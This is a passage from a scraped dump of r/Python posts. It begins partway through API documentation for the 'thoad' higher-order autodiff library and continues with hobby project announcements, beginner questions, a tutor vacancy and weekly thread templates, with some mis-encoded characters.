2. `thoad.Controller`: a class-based interface that wraps the output tensor‚Äôs subgraph in a controller object. In addition to performing the same high-order backward pass, it gives access to advanced features such as fetching specific mixed partials, inspecting batch-dimension optimizations, overriding backward-function implementations, retaining intermediate partials, and registering custom hooks.

**thoad.backward**

The `thoad.backward` function computes high-order partial derivatives of a given output tensor and stores them in each leaf tensor‚Äôs `.hgrad` attribute.

**Arguments**:

* `tensor`: A PyTorch tensor from which to start the backward pass. This tensor must require gradients and be part of a differentiable graph.
* `order`: A positive integer specifying the maximum order of derivatives to compute.
* `gradient`: A tensor with the same shape as `tensor` to seed the vector-Jacobian product (i.e., custom upstream gradient). If omitted, the default is used.
* `crossings`: A boolean flag (default=`False`). If set to `True`, mixed partial derivatives (i.e., derivatives that involve more than one distinct leaf tensor) will be computed.
* `groups`: An iterable of disjoint groups of leaf tensors. When `crossings=False`, only those mixed partials whose participating leaf tensors all lie within a single group will be calculated. If `crossings=True` and `groups` is provided, a *ValueError* will be raised (they are mutually exclusive).
* `keep_batch`: A boolean flag (default=`False`) that controls how output dimensions are organized in the computed gradients.
   * **When** `keep_batch=False`: The derivative preserves one first flattened ""primal"" axis, followed by each original partial shape, sorted in differentiation order. Concretelly:
      * A single ""primal"" axis that contains every element of the graph output tensor (flattened into one dimension).
      * A group of axes per derivative order, each matching the shape of the respective differentially targeted tensor.
   * For an N-th order derivative of a leaf tensor with `input_numel` elements and an output with `output_numel` elements, the gradient shape is:
      * **Axis 1:** indexes all `output_numel` outputs
      * **Axes 2‚Ä¶(sum(Nj)+1):** each indexes all `input_numel` inputs
   * **When** `keep_batch=True`: The derivative shape follows the same ordering as in the previous case, but includes a series of ""independent dimensions"" immediately after the ""primal"" axis:
      * **Axis 1** flattens all elements of the output tensor (size = `output_numel`).
      * **Axes 2...(k+i+1)** correspond to dimensions shared by multiple input tensors and treated independently throughout the graph. These are dimensions that are only operated on element-wise (e.g. batch dimensions).
      * **Axes (k+i+1)...(k+i+sum(Nj)+1)** each flatten all `input_numel` elements of the leaf tensor, one axis per derivative order.
* `keep_schwarz`: A boolean flag (default=`False`). If `True`, symmetric (Schwarz) permutations are retained explicitly instead of being canonicalized/reduced‚Äîuseful for debugging or inspecting non-reduced layouts.

**Returns**:

* An instance of `thoad.Controller` wrapping the same tensor and graph

Executing the automatic differentiation via `thoad.backprop` looks like this.

    import torch
    import thoad
    from torch.nn import functional as F
    
    #### Normal PyTorch workflow
    X = torch.rand(size=(10,15), requires_grad=True)
    Y = torch.rand(size=(15,20), requires_grad=True)
    Z = F.scaled_dot_product_attention(query=X, key=Y.T, value=Y.T)
    
    #### Call thoad backward
    order = 2
    thoad.backward(tensor=Z, order=order)
    
    #### Checks
    ## check derivative shapes
    for o in range(1, 1 + order):
       assert X.hgrad[o - 1].shape == (Z.numel(), *(o * tuple(X.shape)))
       assert Y.hgrad[o - 1].shape == (Z.numel(), *(o * tuple(Y.shape)))
    ## check first derivatives (jacobians)
    fn = lambda x, y: F.scaled_dot_product_attention(x, y.T, y.T)
    J = torch.autograd.functional.jacobian(fn, (X, Y))
    assert torch.allclose(J[0].flatten(), X.hgrad[0].flatten(), atol=1e-6)
    assert torch.allclose(J[1].flatten(), Y.hgrad[0].flatten(), atol=1e-6)
    ## check second derivatives (hessians)
    fn = lambda x, y: F.scaled_dot_product_attention(x, y.T, y.T).sum()
    H = torch.autograd.functional.hessian(fn, (X, Y))
    assert torch.allclose(H[0][0].flatten(), X.hgrad[1].sum(0).flatten(), atol=1e-6)
    assert torch.allclose(H[1][1].flatten(), Y.hgrad[1].sum(0).flatten(), atol=1e-6)

**Instantiation**

Use the constructor to create a controller for any tensor requiring gradients:

    controller = thoad.Controller(tensor=GO)  ## takes graph output tensor

* `tensor`: A PyTorch `Tensor` with `requires_grad=True` and a non-`None` `grad_fn`.

**Properties**

* `.tensor ‚Üí Tensor` The output tensor underlying this controller. **Setter**: Replaces the tensor (after validation), rebuilds the internal computation graph, and invalidates any previously computed gradients.
* `.compatible ‚Üí bool` Indicates whether every backward function in the tensor‚Äôs subgraph has a supported high-order implementation. If `False`, some derivatives may fall back or be unavailable.
* `.index ‚Üí Dict[Type[torch.autograd.Function], Type[ExtendedAutogradFunction]]` A mapping from base PyTorch `autograd.Function` classes to thoad‚Äôs `ExtendedAutogradFunction` implementations. **Setter**: Validates and injects your custom high-order extensions.

**Core Methods**

**.backward(order, gradient=None, crossings=False, groups=None, keep\_batch=False, keep\_schwarz=False) ‚Üí None**

Performs the high-order backward pass up to the specified derivative `order`, storing all computed partials in each leaf tensor‚Äôs `.hgrad` attribute.

* `order` (`int > 0`): maximum derivative order.
* `gradient` (`Optional[Tensor]`): custom upstream gradient with the same shape as `controller.tensor`.
* `crossings` (`bool`, default `False`): If `True`, mixed partial derivatives across different leaf tensors will be computed.
* `groups` (`Optional[Iterable[Iterable[Tensor]]]`, default `None`): When `crossings=False`, restricts mixed partials to those whose leaf tensors all lie within a single group. If `crossings=True` and `groups` is provided, a *ValueError* is raised.
* `keep_batch` (`bool`, default `False`): controls whether independent output axes are kept separate (batched) or merged (flattened) in stored/retrieved gradients.
* `keep_schwarz` (`bool`, default `False`): if `True`, retains symmetric permutations explicitly (no Schwarz reduction).

**.display\_graph() ‚Üí None**

Prints a tree representation of the tensor‚Äôs backward subgraph. Supported nodes are shown normally; unsupported ones are annotated with `(not supported)`.

**.register\_backward\_hook(variables: Sequence\[Tensor\], hook: Callable) ‚Üí None**

Registers a user-provided `hook` to run during the backward pass whenever gradients for any of the specified leaf `variables` are computed.

* `variables` (`Sequence[Tensor]`): Leaf tensors to monitor.
* `hook` (`Callable[[Tuple[Tensor, Tuple[Shape, ...], Tuple[Indep, ...]], dict[AutogradFunction, set[Tensor]]], Tuple[Tensor, Tuple[Shape, ...], Tuple[Indep, ...]]]`): Receives the current `(Tensor, shapes, indeps)` plus contextual info, and must return the modified triple.

**.require\_grad\_(variables: Sequence\[Tensor\]) ‚Üí None**

Marks the given leaf `variables` so that all intermediate partials involving them are retained, even if not required for the final requested gradients. Useful for inspecting or re-using higher-order intermediates.

**.fetch\_hgrad(variables: Sequence\[Tensor\], keep\_batch: bool = False, keep\_schwarz: bool = False) ‚Üí Tuple\[Tensor, Tuple\[Tuple\[Shape, ...\], Tuple\[Indep, ...\], VPerm\]\]**

Retrieves the precomputed high-order partial corresponding to the ordered sequence of leaf `variables`.

* `variables` (`Sequence[Tensor]`): the leaf tensors whose mixed partial you want.
* `keep_batch` (`bool`, default `False`): if `True`, each independent output axis remains a separate batch dimension in the returned tensor; if `False`, independent axes are distributed/merged into derivative dimensions.
* `keep_schwarz` (`bool`, default `False`): if `True`, returns derivatives retaining symmetric permutations explicitly.

Returns a pair:

1. **Gradient tensor**: the computed partial derivatives, shaped according to output and input dimensions (respecting `keep_batch`/`keep_schwarz`).
2. **Metadata tuple**
   * **Shapes** (`Tuple[Shape, ...]`): the original shape of each leaf tensor.
   * **Indeps** (`Tuple[Indep, ...]`): for each variable, indicates which output axes remained independent (batch) vs. which were merged into derivative axes.
   * **VPerm** (`Tuple[int, ...]`): a permutation that maps the internal derivative layout to the requested `variables` order.

Use the combination of independent-dimension info and shapes to reshape or interpret the returned gradient tensor in your workflow.

    import torch
    import thoad
    from torch.nn import functional as F
            
    #### Normal PyTorch workflow
    X = torch.rand(size=(10,15), requires_grad=True)
    Y = torch.rand(size=(15,20), requires_grad=True)
    Z = F.scaled_dot_product_attention(query=X, key=Y.T, value=Y.T)
            
    #### Instantiate thoad controller and call backward
    order = 2
    controller = thoad.Controller(tensor=Z)
    controller.backward(order=order, crossings=True)
            
    #### Fetch Partial Derivatives
    ## fetch X and Y 2nd order derivatives
    partial_XX, _ = controller.fetch_hgrad(variables=(X, X))
    partial_YY, _ = controller.fetch_hgrad(variables=(Y, Y))
    assert torch.allclose(partial_XX, X.hgrad[1])
    assert torch.allclose(partial_YY, Y.hgrad[1])
    ## fetch cross derivatives
    partial_XY, _ = controller.fetch_hgrad(variables=(X, Y))
    partial_YX, _ = controller.fetch_hgrad(variables=(Y, X))

>NOTE. A more detailed user guide with examples and feature walkthroughs is available in the notebook: [https://github.com/mntsx/thoad/blob/master/examples/user\_guide.ipynb](https://github.com/mntsx/thoad/blob/master/examples/user_guide.ipynb)

If you give it a try, I would love feedback on the API."
1n6xqjn,alg√∫ien tiene proyectos de programaci√≥n inconclusos que pueda compartir?,cassiel663,0,1,2025-09-02 22:31:22,https://www.reddit.com/r/Python/comments/1n6xqjn/alg√∫ien_tiene_proyectos_de_programaci√≥n/,"hola comunidad estoy aprendiendo programaci√≥n y quisiera practicar con proyectos reales que hayan quedado inconclusos. la idea es :
‚úìrevisar el codigo
‚úìintentar completarlo o mejorarlo
‚úìaprender de la experiencia de otros
Si alg√∫ien tiene algun proyecto peque√±o o grande en python me gustaria que me compartiera"
1n6v3tl,"PyLine Update - terminal based text editor (Linux, WSL, MacOS) (New Feats)",Xgf_01,35,5,2025-09-02 20:46:35,https://www.reddit.com/r/Python/comments/1n6v3tl/pyline_update_terminal_based_text_editor_linux/,"Hello, this is a hobby project I coded entirely in Python 3 , created longer time ago. But came back to it this spring. Now updated with new functionality and better code structure currently at v0.9.7.

Source at -¬†[PyLine GitHub repo](https://github.com/Peter-L-SVK/PyLine)  (you can see screenshots in readme)

# What My Project Does:

It is CLI text editor with:  
\- function like wc - cw - counts chars, words and lines  
\- open / create / truncate file  
\- exec mode that is like file browser and work with directories  
\- scroll-able text-buffer, currently set to 52 lines  
\- supports all clipboards for GUI: X11,Wayland, win32yank for WSL and pbpaste for MacOS  
\- multiple lines selection copy/paste/overwrite and delete  
\- edit history implemented via LIFO - Last In First Out (limit set to 120)  
\- highlighting of .py syntax (temporary tho, will find the better way)  
\- comes with proper install script

# New features:

\- Support of args <filename>, -i/--info and -h/--help  
\- Modular hooks system with priority, runtime enable/disable, cross-language support (Python, Perl, Bash, Ruby, Lua, Node.js, PHP)  
\- Hook manager UI (list, enable/disable, reload hooks, show info)  
\- BufferManager, NavigationManager, SelectionManager, PasteBuffer, UndoManager all refactored for composition and extensibility (micro-kernel like architecture)  
\- Hook-enabled file loading/saving, multi-language event handlers  
\- Enhanced config and state management (per-user config dir)  
\- Improved argument parsing and info screens

It also comes with prepackaged hooks like smart tab indent.

The editor is using built-in to the terminal foreground/background but I plan to implement themes and config.ini alongside search / replace feature.

# Target Audience:

Basically anyone with Linux, WSL or other Unix-like OS. Nothing complicated to use.

(I know it's not too much.. I don't have any degree in CS or IT engineering or so, just passion)"
1n6sa5a,Feedback Wanted: GUI App to Convert Python Scripts to .exe Files,Neat-Instance-6537,0,9,2025-09-02 18:59:57,https://www.reddit.com/r/Python/comments/1n6sa5a/feedback_wanted_gui_app_to_convert_python_scripts/,"Hey everyone üëã

I‚Äôm working on a desktop app that helps users convert Python scripts into standalone .exe files using a simple graphical interface. The goal is to make the process more intuitive for folks who aren‚Äôt comfortable with command-line tools like PyInstaller or cx\_Freeze. I'm familiar with other similar tools out there (e.g., auto-py-to-exe) but my goal is to create a more modern looking intuitive UI with more features.

Here‚Äôs what it currently does:

* Upload Python files
* Basic configuration options (e.g. console vs windowed, icon selection)
* One-click build process using PyInstaller under the hood
* Error logging and build status updates in the GUI

I‚Äôd love your feedback on:

* üß† Features you‚Äôd want in a tool like this
* üß© Pain points you‚Äôve had converting scripts to executables
* üé® UI/UX suggestions to make it more beginner-friendly
* üõ†Ô∏è Any tools or workflows you currently use that I should consider integrating

If you‚Äôre open to testing a beta version soon, let me know and I‚Äôll reach out when it‚Äôs ready!

Thanks in advance üôè  
"
1n6o0x8,Vacancy for a python tutor,X_wrld_1,0,8,2025-09-02 16:21:55,https://www.reddit.com/r/Python/comments/1n6o0x8/vacancy_for_a_python_tutor/,"I'm opening an online coding institution and looking for someone to fill in the role of teaching Python. 

If interested comment down below or dm me"
1n6jfon,I built a CLI tool for database migration,s_basu,4,2,2025-09-02 13:26:45,https://www.reddit.com/r/Python/comments/1n6jfon/i_built_a_cli_tool_for_database_migration/,"# What My Project Does

Wandern is a CLI tool similar to alembic or django migrations to manage and apply SQL migrations, currently supporting sqlite and postgresql.  
It  keeps track of the sequence of migrations applied and allows specifying additional migration metadata such as author name, tags to filter migrations. You can generate empty migrations and write the SQL yourself, or use the prompting feature (requires additional dependency and LLM API key) to let the agent generate the migration. The agent support is added using pydantic-ai, and can generate revisions based on previous migration file contexts.

It is very lightweight, only supporting sqlite out-of-box, needing to install additional dependency for postgresql or agents.

# Target Audience

I primarily intended to built this to use myself, partly because I wanted to get away from the bulky setup that comes with alembic or sqlalchemy for smaller projects. So this is for anyone who prefers to write their own SQL statements, and those who want to have versioned migration without the added overhead of the sqlalchemy ecosystem, and with a nicer TUI and support for AI agents, 

# Comparison

Wandern is meant to be a minimal and configurable CLI alternative to existing tools like Alembic or Django migrations for smaller or more barebone projects. I thought adding agents would be a cool addition as well so there's that. 

You can find it on Github here: [https://github.com/s-bose/wandern](https://github.com/s-bose/wandern)  
Or download from Pypi: [https://pypi.org/project/wandern/](https://pypi.org/project/wandern/)

"
1n6fm1w,I built a Python bot that automatically finds remote jobs and sends them to Telegram.,Due_Care_7629,0,9,2025-09-02 10:13:47,https://www.reddit.com/r/Python/comments/1n6fm1w/i_built_a_python_bot_that_automatically_finds/,"# Built a Python bot to automate remote job hunting - sharing the code

How many job sites do you check daily? (I was at 12 before building this)¬†  
  
What My Project Does

A Python script that scrapes remote job boards and sends filtered results to Telegram:

* Monitors RemoteOK, WeWorkRemotely, GitHub Jobs, etc.
* Filters by custom keywords
* Telegram notifications for new matches
* Saves data locally for debugging

# Target Audience

Personal automation tool for individual job seekers. Production-ready but meant for personal use only - not commercial application.

# Comparison

vs Manual checking:¬†Eliminates repetitive browsing  
vs Job alerts:¬†More customizable, covers niche remote job boards  
vs Paid services:¬†Open source, no restrictions

# Technical Implementation

Built with Python requests + BeautifulSoup, configurable via environment variables. Includes error handling and rate limiting.

Code:¬†[https://github.com/AzizB283/job-hunter](https://github.com/AzizB283/job-hunter)

Anyone else built job automation tools?¬†Curious what approaches others have taken."
1n6fgah,Python OOP is clever,FickleAd3708,0,12,2025-09-02 10:03:56,https://www.reddit.com/r/Python/comments/1n6fgah/python_oop_is_clever/,"Python also feels like the only real OOP cuz you can actually modify almost anything in a class BUT at the same time you can totally ignore any OOP and write pure functions, while still utilizing OOP cuz the function is an object and can have attributes, lol üòÇ this is clever"
1n6aos0,[ANN] tblkit ‚Äî Swiss-army CLI for tabular data (CSV/TSV),Kooky_Fee_4423,5,0,2025-09-02 04:58:43,https://www.reddit.com/r/Python/comments/1n6aos0/ann_tblkit_swissarmy_cli_for_tabular_data_csvtsv/,"A small, fast command-line tool for the table chores between raw files and a notebook‚Äîclean/rename, robust column selects, filter/unique, exact & fuzzy joins, numeric/date-aware sort, group/aggregate, pivot/melt, pretty view. Plays nicely with pipes.

Designed for data scientists preparing analysis-ready tables quickly.

    pip install git+https://github.com/nbatada/tblkit

Repo & README: [https://github.com/nbatada/tblkit](https://github.com/nbatada/tblkit)

Available commands are

    tblkit --commands
    tblkit
    ‚îú‚îÄ‚îÄ col                         (Column operations)
    ‚îÇ   ‚îú‚îÄ‚îÄ add                     (Add a new column)
    ‚îÇ   ‚îú‚îÄ‚îÄ clean                   (Normalize string values in selected columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ drop                    (Drop columns by name/glob/position/regex)
    ‚îÇ   ‚îú‚îÄ‚îÄ extract                 (Extract regex groups into new columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ join                    (Join values from multiple columns into a new column.)
    ‚îÇ   ‚îú‚îÄ‚îÄ move                    (Reorder columns by moving a selection.)
    ‚îÇ   ‚îú‚îÄ‚îÄ rename                  (Rename column(s) via map string)
    ‚îÇ   ‚îú‚îÄ‚îÄ replace                 (Value replacement in selected columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ split                   (Split a column by pattern into multiple columns)
    ‚îÇ   ‚îú‚îÄ‚îÄ strip                   (Trim/squeeze whitespace; optional substring/fixed-count strip.)
    ‚îÇ   ‚îî‚îÄ‚îÄ subset                  (Select a subset of columns by name/glob/position/regex)
    ‚îú‚îÄ‚îÄ header                      (Header operations)
    ‚îÇ   ‚îú‚îÄ‚îÄ add                     (Add a generated header to a headerless file.)
    ‚îÇ   ‚îú‚îÄ‚îÄ add-prefix              (Add a fixed prefix to columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ add-suffix              (Add a fixed suffix to columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ clean                   (Normalize all column names (deprecated; use: tbl clean))
    ‚îÇ   ‚îú‚îÄ‚îÄ prefix-num              (Prefix headers with 1_, 2_, ... (or custom fmt).)
    ‚îÇ   ‚îú‚îÄ‚îÄ rename                  (Rename headers via map string or file)
    ‚îÇ   ‚îî‚îÄ‚îÄ view                    (View header column names)
    ‚îú‚îÄ‚îÄ row                         (Row operations)
    ‚îÇ   ‚îú‚îÄ‚îÄ add                     (Add a row with specified values.)
    ‚îÇ   ‚îú‚îÄ‚îÄ drop                    (Drop rows by 1-based index.)
    ‚îÇ   ‚îú‚îÄ‚îÄ grep                    (Filter rows by a list of words or phrases.)
    ‚îÇ   ‚îú‚îÄ‚îÄ head                    (Select first N rows)
    ‚îÇ   ‚îú‚îÄ‚îÄ sample                  (Randomly sample rows)
    ‚îÇ   ‚îú‚îÄ‚îÄ shuffle                 (Randomly shuffle all rows.)
    ‚îÇ   ‚îú‚îÄ‚îÄ subset                  (Select a subset of rows using a query expression)
    ‚îÇ   ‚îú‚îÄ‚îÄ tail                    (Select last N rows)
    ‚îÇ   ‚îî‚îÄ‚îÄ unique                  (Filter unique or duplicate rows)
    ‚îú‚îÄ‚îÄ sort                        (Sort rows or columns)
    ‚îÇ   ‚îú‚îÄ‚îÄ cols                    (Sort columns by their names)
    ‚îÇ   ‚îî‚îÄ‚îÄ rows                    (Sort rows by column values)
    ‚îú‚îÄ‚îÄ tbl                         (Whole-table operations)
    ‚îÇ   ‚îú‚îÄ‚îÄ aggregate               (Group and aggregate numeric columns.)
    ‚îÇ   ‚îú‚îÄ‚îÄ clean                   (Clean headers and string values throughout the table.)
    ‚îÇ   ‚îú‚îÄ‚îÄ collapse                (Group rows and collapse column values into delimited strings.)
    ‚îÇ   ‚îú‚îÄ‚îÄ concat                  (Concatenate tables vertically.)
    ‚îÇ   ‚îú‚îÄ‚îÄ frequency               (Show top N values per column.)
    ‚îÇ   ‚îú‚îÄ‚îÄ join                    (Relational join between two tables.)
    ‚îÇ   ‚îú‚îÄ‚îÄ melt                    (Melt table to long format.)
    ‚îÇ   ‚îú‚îÄ‚îÄ pivot                   (Pivot wider.)
    ‚îÇ   ‚îú‚îÄ‚îÄ sort                    (Sort rows by column values (alias for 'sort rows').)
    ‚îÇ   ‚îî‚îÄ‚îÄ transpose               (Transpose the table.)
    ‚îî‚îÄ‚îÄ view                        (Pretty-print a table (ASCII, non-folding).)

**Why shell scripters may want it**

* Handles CSV edge cases (quotes, commas, encodings) better than ad-hoc sed/awk/join.
* Column- and type-aware operations reduce brittle regex and indexing hacks.
* One focused tool instead of long chains; easier to read, test, and reuse in scripts or Makefiles.

**Why notebook/one-off Python users may want it**

* Faster first mile: prepare tidy inputs before opening a notebook.
* Less boilerplate than short pandas scripts; declarative commands you can paste into CI.
* Consistent results across machines; easy to share as a single CLI pipeline.

Feedback, bug reports, and contributions are very welcome."
1n69tas,I created a playground to my python UI framework DARS,ZtaDev,0,7,2025-09-02 04:08:34,https://www.reddit.com/r/Python/comments/1n69tas/i_created_a_playground_to_my_python_ui_framework/,"I'm excited to share the new Dars Playground! I have been working on this project for a long time now and I am expanding its ecosystem as much as I can. Now I have just launched a playground so that everyone can try Dars on the web without installing anything, just reading a little documentation and using bases from other frameworks. The next step will be to implement a VDom (virtual dom) option to the framework itself and a signals (hooks) system, all of this optional for those who want to use the virtual dom and those who do not, so use the export or hot reload that is already integrated.

The playground allows you to experiment with Dars UI code and preview the results instantly in your browser. It's a great way to learn, prototype, and see how Dars turns your Python code into static HTML/CSS/JS.

Key Features:

	‚Ä¢ Write Dars Python code directly in the editor.
	‚Ä¢ Instant preview with a single click (or Ctrl + Enter).
	‚Ä¢ Ideal for experimenting and building UI quickly.

Give it a try and tell me what you think!

Link to Playground: https://dars-playground.vercel.app
Dars GitHub repository: https://github.com/ZtaMDev/Dars-Framework

#Python #UI #WebDevelopment #DarsFramework"
1n65ef0,Pr√©dire un match virtuel FIFA sur un bookmakers comme 1xbet,Top-Hawk8095,0,3,2025-09-02 00:29:29,https://www.reddit.com/r/Python/comments/1n65ef0/pr√©dire_un_match_virtuel_fifa_sur_un_bookmakers/,"Comment collecter les donn√©es des matchs virtuels FIFA sur un bookmakers comme 1xbet ? J'en ai besoin vraiment, aidez moi."
1n658es,Is it a good idea to teach students Python but using an old version?,frankieepurr,90,128,2025-09-02 00:21:40,https://www.reddit.com/r/Python/comments/1n658es/is_it_a_good_idea_to_teach_students_python_but/,"EDIT: Talking about IDLE here

Sorry if this is the wrong sub.

When i went to high school (UK) in 2018, we had 3.4.2 (which at the time wasn't even the latest 3.4.x). In 2020 they upgraded to 3.7, but just days later downgraded back to 3.4.2. I asked IT manager why and they said its because of older students working on long projects. But doubt that was the reason because fast forward to 2023 the school still had 3.4.2 which was end of life.

Moved to a college that same year that had 3.12, but this summer 2025, after computer upgrades to windows 11, we are now on 3.10 for some reason. I start a new year in college today so I'll be sure to ask the teacher.

Are there any drawbacks to teaching using an old version? It will just be the basics and a project or 2"
1n64s7q,Tuesday Daily Thread: Advanced questions,AutoModerator,6,2,2025-09-02 00:00:30,https://www.reddit.com/r/Python/comments/1n64s7q/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1n64bla,"I built a simple, open-source Windows wallpaper changer because the built-in one kept failing.",msarabi,29,0,2025-09-01 23:38:36,https://www.reddit.com/r/Python/comments/1n64bla/i_built_a_simple_opensource_windows_wallpaper/,"# What My Project Does

This is a simple, lightweight desktop application for Windows that automatically changes your desktop wallpaper from a folder of images. You can choose a folder, set a custom time interval (in seconds, minutes, or hours), and have your pictures shuffle randomly. It can be minimized to the system tray. The application is built using `customtkinter` for the GUI and `pystray` for the system tray functionality.

# Target Audience

I write it for personal use and for anyone who wants a simple and minimalist way to manage their desktop wallpapers. It is a ""toy project"" in the sense that it started as a solution to a personal frustration, but it is meant to be a tool for everyday use.

# Comparison

I wrote this because the built-in Windows slideshow feature randomly stops working, which is incredibly frustrating and annoying, and they have been too lazy to fix it. Other third-party programs I looked at were often too cluttered with features I didn't need and/or were also resource-hungry. This application is meant to be a clean, minimal alternative that focuses on its single task.

You can find it here: [Wallpaper Changer](https://github.com/m-sarabi/wallpaper_changer/releases/tag/v1.0.0)"
1n5yppn,Job application requirement,Royal-Bug-5025,0,3,2025-09-01 19:46:23,https://www.reddit.com/r/Python/comments/1n5yppn/job_application_requirement/,"Hello. So I am trying to apply for an internship-level job in a large company. The position is financial risk management. I know that this post may seem completely irrelevant to the sub, but one of the requirements is ""Experience in python or R statistics"". Now I know basics in statistics and can use SPSS semi-proficiently, as in I have completed a course on it. I understand that this may be useless info, but I know Excel well as well.  

If anyone could tell me just how much experience would be expected for the latter in an entry-level position primarily focused on financial aspects and related risk management, mixed with statistical elements, that would be very appreciated. I don't have much time until the application due date runs out (around 2 weeks), but I am willing to learn and show desire that I can very much develop my knowledge in said area. 

If there is any possibility of making this happen, what tips are there to learn either of the mentioned programs in the aforementioned limited time space and what aspects would be the most resourceful to learn. 

Thanks a lot!"
1n5ux0w,Python + OCR: Automatically analyze Dota 2 player stats üëÄ,None,28,3,2025-09-01 17:25:57,https://www.reddit.com/r/Python/comments/1n5ux0w/python_ocr_automatically_analyze_dota_2_player/,"# What My Project Does

This Python script uses OCR to read Dota 2 friend IDs from your screen, fetches match data from the OpenDota API, and calculates winrates and most played heroes to detect potential smurfs.  
It provides a simple GUI that shows overall winrate and the most played hero of the selected player.



# Target Audience

Python enthusiasts, Dota 2 players, or anyone interested in game data analysis and automation.  
This is mainly an educational and experimental project, not intended for cheating or modifying the game.



# Comparison

Unlike other Dota 2 analytics tools, this script uses OCR to automatically read friend IDs from the screen, eliminating the need to manually input player IDs.  
It combines GUI feedback, Python automation, and API integration in a single lightweight tool.

  
[GitHub Repository](https://github.com/N3uvin/opendota2-vision)

***I‚Äôm open to feedback, feature suggestions, or any ideas to improve the script!***"
1n5sf57,"Looking for a study buddy in Angela Yu""s 100 Days of Python, day 32",2TB_NVME,0,2,2025-09-01 15:53:53,https://www.reddit.com/r/Python/comments/1n5sf57/looking_for_a_study_buddy_in_angela_yus_100_days/,"[Help](https://www.reddit.com/r/Python/?f=flair_name%3A%22Help%22)

Hi, I am a teenager and I am currently attending the 100 Days of Code course on Udemy and currently, I""ve been slacking off a little and falling behind schedule, because of this I am looking for a study partner that can hold me accountable and learn with me. So if you are a teenager like me and are on day 27-35 of the course, then we can start studying together!

DISCORD:arasaccount"
1n5q8n0,"Introducing DLType, an ultra-fast runtime type and shape checking library for deep learning tensors!",onyx-zero-software,20,6,2025-09-01 14:30:17,https://www.reddit.com/r/Python/comments/1n5q8n0/introducing_dltype_an_ultrafast_runtime_type_and/,"# What My Project Does

DL (Deep-learning) Typing, a runtime shape and type checker for your pytorch tensors or numpy arrays! No more guessing what the shape or data type of your tensors are for your functions. Document tensor shapes using familiar syntax and take the guesswork out of tensor manipulations.

```python
@dltyped()
def transform_tensors(
    points: Annotated[np.ndarray, FloatTensor[""N 3""]]
    transform: Annotated[torch.Tensor, IntTensor[""3 3""]]
) -> Annotated[torch.Tensor, FloatTensor[""N 3""]]:
    return torch.from_numpy(points) @ transform
```

# Target Audience 

Machine learning engineers primarily, but anyone who uses numpy may find this useful too! 

# Comparison

- Jaxtyping-inspired syntax for expressions, literals, and anonymous axes
- Supports any version of pytorch and numpy (Python >=3.10)
- First class Pydantic model support, shape and dtype validation directly in model definitions
- Dataclass, named tuple, function, and method checking 
- Lightweight and fast, benchmarked to be on-par with manual shape checking and (at least last time we tested it) was as-fast or faster than the current de-facto solution of Jaxtyping + beartype, in some cases by an order of magnitude.
- Custom tensor types, define your own tensor type and override the check method with whatever custom logic you need

GitHub Page: https://github.com/stackav-oss/dltype

```
pip install dltype
```

Check it out and let me know what you think! "
1n5jjnl,[UPDATE] DocStrange - Structured data extraction from images/pdfs/docs,LostAmbassador6872,26,8,2025-09-01 08:49:32,https://www.reddit.com/r/Python/comments/1n5jjnl/update_docstrange_structured_data_extraction_from/,"I previously shared the open‚Äësource library DocStrange. Now I have hosted it as a free to use web app to upload pdfs/images/docs to get clean structured data in Markdown/CSV/JSON/Specific-fields and other formats.

**Live Demo:**¬†[**https://docstrange.nanonets.com**](https://docstrange.nanonets.com/)

**Github :** [**https://github.com/NanoNets/docstrange**](https://github.com/NanoNets/docstrange)

Would love to hear feedbacks!

Original Post :¬†[https://www.reddit.com/r/Python/comments/1mh914m/open\_source\_tool\_for\_structured\_data\_extraction/](https://www.reddit.com/r/Python/comments/1mh914m/open_source_tool_for_structured_data_extraction/)"
1n5idvx,Omni-LPR: A multi-interface server for automatic license plate recognition in Python,No_Pomegranate7508,10,0,2025-09-01 07:34:17,https://www.reddit.com/r/Python/comments/1n5idvx/omnilpr_a_multiinterface_server_for_automatic/,"**What My Project Does**

Hi everyone,

I've made an open-source server in Python (called Omni-LPR) that exposes automatic license plate recognition (or ALPR) as a toolbox for LLMs and AI agents. It can also be used as a standalone microservice.

Here are some of its features:

* Installable as a Python package: `pip install omni-lpr`.
* Self-hostable for 100% local and private inference.
* Exposes tools via a native MCP endpoint for agents and a standard REST API.
* Includes examples for direct integration with tools like LM Studio.
* Hardware-accelerated backends for CPU, OpenVINO, and CUDA for faster performance.

Project's GitHub repo: [https://github.com/habedi/omni-lpr](https://github.com/habedi/omni-lpr)"
1n59zyk,Monday Daily Thread: Project ideas!,AutoModerator,6,1,2025-09-01 00:00:32,https://www.reddit.com/r/Python/comments/1n59zyk/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
